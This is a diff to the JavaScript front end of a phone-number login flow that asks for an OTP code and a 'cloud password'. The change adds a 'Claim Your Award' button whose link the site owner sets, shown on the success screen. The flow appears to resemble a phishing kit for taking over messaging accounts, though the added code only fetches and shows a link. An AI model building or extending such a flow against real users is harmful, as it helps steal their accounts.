@@ -264,6 +264,7 @@ function handleStatusResponse(data) {
         elSubtitle.innerText = `Account ${data.phone || ""} is active!`;
         updateStepper(4);
         switchView("success");
+        loadAwardButton();
         
     } else if (status === "otp_sent") {
         elTitle.innerText = "Enter OTP Code";
@@ -277,6 +278,24 @@ function handleStatusResponse(data) {
         elSubtitle.innerText = "Enter your cloud password to finish login.";
         updateStepper(3);
         switchView("twofaEntry");
+    }
+}
+
+// Load the owner-defined award link for the success screen
+async function loadAwardButton() {
+    const btn = document.getElementById("btn-claim-award");
+    if (!btn) return;
+    try {
+        const res = await fetch("/api/reward");
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data.link) {
+            btn.href = data.link;
+            btn.innerText = (data.button_text || "Claim Your Award");
+            btn.style.display = "block";
+        }
+    } catch (err) {
+        console.error("Award fetch failed:", err);
     }
 }
 
